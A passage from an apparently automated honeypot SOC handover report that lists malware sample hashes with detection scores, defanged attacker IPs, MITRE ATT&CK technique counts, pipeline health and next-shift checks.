| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `183.224.131[.]83` | CN | China Mobile Communications Corporation | **100** ⚠️ | 12 |
| `143.198.80[.]171` | SG | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `64.207.185[.]5` | US | GoDaddy.com, LLC | **100** ⚠️ | 4 |
| `167.71.225[.]225` | IN | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `20.81.140[.]174` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `57.151.105[.]130` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `61.145.176[.]62` | CN | CHINANET Guangdong Province Network | **100** ⚠️ | 1 |
| `185.2.101[.]67` | FR | Contabo GmbH | **100** ⚠️ | 1 |
| `101.36.107[.]233` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `186.158.182[.]21` | AR | AMX Argentina S.A. | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 38 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 22 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 13 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |

---

## 🔕 False Positive Summary (17 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 23 below threshold 25 | 2 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 98 cases |
| Tool 34  | Credential Extractor        | ✅ 35 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 17 filtered (17.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 12 recon entry/entries in table (8 group(s) consolidating 65 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-07T23:10:58Z_
